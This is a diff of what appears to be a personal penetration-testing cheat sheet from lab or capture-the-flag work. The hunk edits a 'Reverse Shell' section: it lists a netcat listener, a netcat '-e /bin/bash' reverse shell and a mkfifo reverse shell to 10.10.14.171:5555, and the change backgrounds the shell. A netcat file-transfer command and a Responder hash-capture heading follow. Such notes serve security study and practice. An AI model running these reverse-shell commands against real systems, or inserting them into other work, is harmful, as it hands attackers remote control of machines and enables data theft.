@@ -174,7 +174,7 @@ Revrse Shell
 NetCat
   Listener: nc -lvnp 5555
   NC Bash: nc 10.10.14.171 5555 -e /bin/bash
-  OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.171 5555 >/tmp/f
+  OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.171 5555 >/tmp/f &
   File xfer: Listener: nc -l -p 1234 > out.file - Sender: nc -w 3 IP 1234 < out.file
   
 Responder (Can grab hash when a system is attempting to connect to you over SMB)
